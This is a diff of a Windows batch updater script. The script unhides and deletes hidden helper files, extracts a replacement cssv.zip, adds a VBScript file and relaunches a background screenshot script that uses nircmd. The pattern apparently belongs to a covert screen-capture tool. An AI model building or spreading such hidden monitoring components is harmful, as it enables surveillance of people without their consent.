@@ -7,7 +7,7 @@ if %errorlevel% == 0 (
 goto linkbreak
 )
 taskkill /f /fi "windowtitle eq backgroundscreenshot"
-rem del config.cfg
+
 
 :redoconcheck:
 set /a countconnection+=1
@@ -23,13 +23,14 @@ if %errorLevel% == 0 (
 	exit
 )
 
-rem TIMEOUTS HERE NOT NEEDED, ONLY FOR SHOW
 
+attrib -h yoke.vbs
 attrib -h backgroundscreenshot.bat
 attrib -h delete.bat
 attrib -h nircmd.exe
 attrib -h update.bat
 timeout 1 /nobreak > NUL
+del yoke.vbs
 del backgroundscreenshot.bat
 del delete.bat
 del nircmd.exe
@@ -39,11 +40,11 @@ timeout 1 /nobreak > NUL
 echo Waiting to see .zip
 if not exist cssv.zip goto errorwait
 tar.exe -xf cssv.zip
-timeout 1 /nobreak > NUL
-timeout 1 /nobreak > NUL
-timeout 1 /nobreak > NUL
-timeout 1 /nobreak > NUL
-timeout 1 /nobreak > NUL
+timeout 1 /nobreak
+timeout 1 /nobreak
+timeout 1 /nobreak
+timeout 1 /nobreak
+timeout 1 /nobreak
 
 
 :errorwait2:
@@ -52,6 +53,7 @@ if not exist delete.bat goto errorwait2
 if not exist backgroundscreenshot.bat goto errorwait2
 if not exist nircmd.exe goto errorwait2
 if not exist update.bat goto errorwait2
+if not exist yoke.vbs goto errorwait2
 
 :errorwait3:
 echo deleting .zip
@@ -61,6 +63,7 @@ goto errorwait3
 
 :continue:
 echo closing!
+del config.cfg
 start backgroundscreenshot.bat
 :linkbreak:
 set /p oldloc=<loc.th
